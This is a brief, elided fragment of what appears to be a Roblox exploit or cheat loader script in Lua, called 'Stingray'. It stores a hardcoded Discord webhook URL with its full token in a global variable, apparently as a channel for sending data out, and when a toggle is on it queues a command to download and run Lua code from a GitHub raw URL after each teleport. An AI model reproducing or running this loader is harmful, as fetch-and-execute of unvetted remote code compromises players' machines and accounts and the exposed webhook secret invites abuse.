...
if not getgenv().StingrayLoaded then
    ...
    getgenv().Webhook = "https://discord.com/api/webhooks/1048906116676993124/VpDVQkydJ9_tWGjPcDFjHT2B6KvlATRG_gLVaTABFlwCKFTNY0GI6SgZJ1lKTG_Czgfc"
    ...
    if Toggle == "ON" then
        local S, E = pcall(function()
            queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/lolwtfpro/hwaktau/refs/heads/main/typeshi.lua"))()')()
        end)
    end
